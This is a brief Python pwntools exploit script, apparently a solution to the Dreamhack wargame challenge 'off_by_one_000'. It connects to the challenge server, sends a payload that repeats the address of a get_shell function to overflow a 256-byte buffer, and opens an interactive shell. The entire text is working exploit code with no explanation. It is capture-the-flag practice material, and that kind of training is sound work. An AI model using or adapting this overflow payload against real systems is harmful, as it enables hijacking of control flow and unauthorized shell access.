from pwn import *

# p = process("./off_by_one_000")
#  nc host3.dreamhack.games 20690
p = remote("host3.dreamhack.games", 20690)

get_shell = 0x80485db

pay = b""
pay += p32(get_shell) * (256 // 4)
p.sendafter(": ", pay)

p.interactive()